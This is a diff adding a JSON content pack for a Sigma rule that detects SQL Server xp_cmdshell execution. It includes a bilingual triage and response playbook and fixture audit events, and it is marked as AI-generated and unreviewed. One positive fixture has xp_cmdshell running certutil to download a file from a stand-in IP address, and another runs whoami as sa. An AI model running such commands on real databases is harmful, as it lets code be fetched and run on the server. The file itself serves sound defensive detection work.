@@ -1,0 +1,124 @@
+{
+  "rule": {
+    "id": "7f103213-a04e-4d59-8261-213dddf22314",
+    "title": "MSSQL XPCmdshell Suspicious Execution",
+    "level": "high",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/builtin/application/mssqlserver/win_mssql_xp_cmdshell_audit_log.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/builtin/application/mssqlserver/win_mssql_xp_cmdshell_audit_log.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un evento de auditoría de SQL Server indica que se ejecutó el procedimiento almacenado xp_cmdshell, es decir, alguien ejecutó comandos del sistema operativo a través del motor de base de datos.",
+      "what_it_detects": "El evento 33205 del registro Application de Windows, de un proveedor MSSQL, cuyo campo Data contiene 'object_name:xp_cmdshell' y 'statement:EXEC'. Requiere una auditoría de SQL Server que registre la ejecución de xp_cmdshell.",
+      "why_it_matters": "xp_cmdshell ejecuta comandos de shell con los privilegios de la cuenta de servicio de SQL Server (ATT&CK Execution, intérprete de comandos). Los atacantes con un login sysadmin, a menudo tras fuerza bruta contra 'sa', lo usan para reconocimiento, descarga de payloads, criptominería y persistencia.",
+      "triage_steps": [
+        "Revise el statement completo en Data: ¿qué comando se ejecutó (whoami, powershell, certutil, bitsadmin, net user, descargas, cadenas codificadas)?",
+        "Identifique server_principal_name, session_server_principal_name y el host o IP cliente. ¿Corresponde a un DBA, un job de SQL Agent o una cuenta de aplicación conocida?",
+        "Verifique si xp_cmdshell se habilitó poco antes: busque sentencias sp_configure o eventos de cambio de configuración en la misma instancia en las últimas horas.",
+        "Busque inicios de sesión fallidos (evento 18456) contra la instancia desde la misma IP o para el mismo login, señal de fuerza bruta.",
+        "Pivote a la telemetría de procesos del host +/- 15 minutos: procesos hijos con ParentImage sqlservr.exe, sobre todo cmd.exe o powershell.exe, y sus conexiones de red.",
+        "Busque persistencia: nuevos logins de SQL, jobs de SQL Agent, procedimientos de inicio (sp_procoption), servicios, tareas programadas o cuentas locales nuevas.",
+        "Revise alertas previas del mismo servidor, login e IP de origen, y confirme si la instancia está expuesta a internet."
+      ],
+      "false_positives": [
+        "Scripts heredados de mantenimiento o respaldo que usan xp_cmdshell para copiar archivos, ejecutar bcp o limpiar directorios.",
+        "Jobs de SQL Agent o herramientas de terceros que dependen de xp_cmdshell por diseño.",
+        "DBAs ejecutando comandos administrativos puntuales y aprobados durante ventanas de cambio."
+      ],
+      "response_steps": [
+        "Confirme con el responsable de la base de datos o el equipo DBA si el login, el comando y la hora corresponden a actividad aprobada; documente y ajuste por login o statement.",
+        "Si no está aprobado, deshabilite xp_cmdshell, deshabilite o restablezca el login usado y bloquee la IP de origen en el firewall.",
+        "Aísle el host si los comandos descargaron o lanzaron payloads; antes recolecte memoria, archivos y logs de auditoría de SQL.",
+        "Elimine la persistencia (jobs, procedimientos de inicio, logins no autorizados, servicios, mineros), rote credenciales de la cuenta de servicio y restrinja la exposición de SQL antes de restablecer el servicio."
+      ],
+      "severity_rationale": "El nivel alto es adecuado porque xp_cmdshell permite ejecutar comandos del sistema operativo directamente desde la base de datos, un paso habitual en compromisos de SQL Server y poco necesario en entornos modernos."
+    },
+    "en": {
+      "summary": "A SQL Server audit event shows that the xp_cmdshell stored procedure was executed, so someone ran operating system commands through the database engine.",
+      "what_it_detects": "Windows Application log event 33205 from an MSSQL provider where the audit Data contains both 'object_name:xp_cmdshell' and 'statement:EXEC'. A SQL Server audit that captures xp_cmdshell execution must be enabled for this event to exist.",
+      "why_it_matters": "xp_cmdshell runs shell commands with the SQL Server service account's privileges (ATT&CK Execution, command and scripting interpreter). Attackers who obtain a sysadmin login, often by brute-forcing 'sa', use it for reconnaissance, payload downloads, cryptominers and persistence.",
+      "triage_steps": [
+        "Read the full statement in Data: what command ran (whoami, powershell, certutil, bitsadmin, net user, downloads, encoded strings)?",
+        "Identify server_principal_name, session_server_principal_name and the client host or IP. Is this a known DBA, SQL Agent job or application account?",
+        "Check whether xp_cmdshell was enabled shortly before: look for sp_configure statements or configuration-change events on the same instance within the last few hours.",
+        "Search for failed logins (event 18456) against the instance from the same source IP or for the same login, which would point to brute force.",
+        "Pivot to process telemetry on the host +/- 15 minutes: child processes with ParentImage sqlservr.exe, mostly cmd.exe or powershell.exe, and their network connections.",
+        "Look for persistence: new SQL logins, SQL Agent jobs, startup procedures (sp_procoption), new services, scheduled tasks or local accounts.",
+        "Review earlier alerts for this server, login and source IP, and check whether the instance is exposed to the internet."
+      ],
+      "false_positives": [
+        "Legacy maintenance or backup scripts that call xp_cmdshell to copy files, run bcp or clean up directories.",
+        "SQL Agent jobs or third-party database tools that rely on xp_cmdshell by design.",
+        "DBAs running approved one-off administrative commands during change windows."
+      ],
+      "response_steps": [
+        "Confirm with the database owner or DBA team whether the login, command and time match approved activity; document legitimate cases and tune by login or statement.",
+        "If not approved, disable xp_cmdshell, disable or reset the login used, and block the source IP at the firewall.",
+        "Isolate the host if commands downloaded or launched payloads; collect memory, files and SQL audit logs first.",
+        "Remove persistence (jobs, startup procedures, rogue logins, services, miners), rotate the service account credentials and restrict SQL exposure before returning to service."
+      ],
+      "severity_rationale": "High fits because xp_cmdshell gives direct operating system command execution from the database, which is a common step in SQL Server compromises and is rarely needed in modern environments."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "SQL audit event 33205 showing the sa login running whoami through xp_cmdshell",
+        "event": {
+          "Channel": "Application",
+          "Provider_Name": "MSSQLSERVER",
+          "EventID": 33205,
+          "Computer": "SQL-PRD-01.example.com",
+          "Level": "Information",
+          "Data": "audit_schema_version:1 event_time:2024-06-26 14:03:12.4471230 sequence_number:1 action_id:EX succeeded:true is_column_permission:false session_id:57 server_principal_id:1 database_principal_id:1 target_server_principal_id:0 target_database_principal_id:0 object_id:-1073741085 class_type:X session_server_principal_name:sa server_principal_name:sa server_instance_name:SQL-PRD-01 database_name:master schema_name:sys object_name:xp_cmdshell statement:EXEC master..xp_cmdshell 'whoami' additional_information: client_ip:203.0.113.45 application_name:Microsoft SQL Server Management Studio"
+        }
+      },
+      {
+        "description": "Named instance provider running a download command via xp_cmdshell",
+        "event": {
+          "Channel": "Application",
+          "Provider_Name": "MSSQL$SQLEXPRESS",
+          "EventID": 33205,
+          "Computer": "WS-0142",
+          "Level": "Information",
+          "Data": "audit_schema_version:1 event_time:2024-06-26 02:17:40.1100000 action_id:EX succeeded:true session_server_principal_name:ANDES\\jperez server_principal_name:ANDES\\jperez database_name:master schema_name:sys object_name:xp_cmdshell statement:exec xp_cmdshell 'certutil -urlcache -f http://198.51.100.20/a.txt C:\\Users\\Public\\a.txt' client_ip:198.51.100.20"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Same audit provider and event ID, but the statement only reconfigures the option via sp_configure; object_name is sp_configure, not xp_cmdshell",
+        "event": {
+          "Channel": "Application",
+          "Provider_Name": "MSSQLSERVER",
+          "EventID": 33205,
+          "Computer": "SQL-PRD-01.example.com",
+          "Level": "Information",
+          "Data": "audit_schema_version:1 event_time:2024-06-26 13:58:01.0020000 action_id:EX succeeded:true session_server_principal_name:sa server_principal_name:sa database_name:master schema_name:sys object_name:sp_configure statement:EXEC sp_configure 'xp_cmdshell', 0 client_ip:192.0.2.10"
+        }
+      },
+      {
+        "description": "Audit event from the MSSQL provider for a routine SELECT on an application table",
+        "event": {
+          "Channel": "Application",
+          "Provider_Name": "MSSQLSERVER",
+          "EventID": 33205,
+          "Computer": "SQL-PRD-01.example.com",
+          "Level": "Information",
+          "Data": "audit_schema_version:1 event_time:2024-06-26 10:12:33.5000000 action_id:SL succeeded:true session_server_principal_name:app_ventas server_principal_name:app_ventas database_name:Ventas schema_name:dbo object_name:Pedidos statement:SELECT TOP 10 * FROM dbo.Pedidos client_ip:192.0.2.25"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:13+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
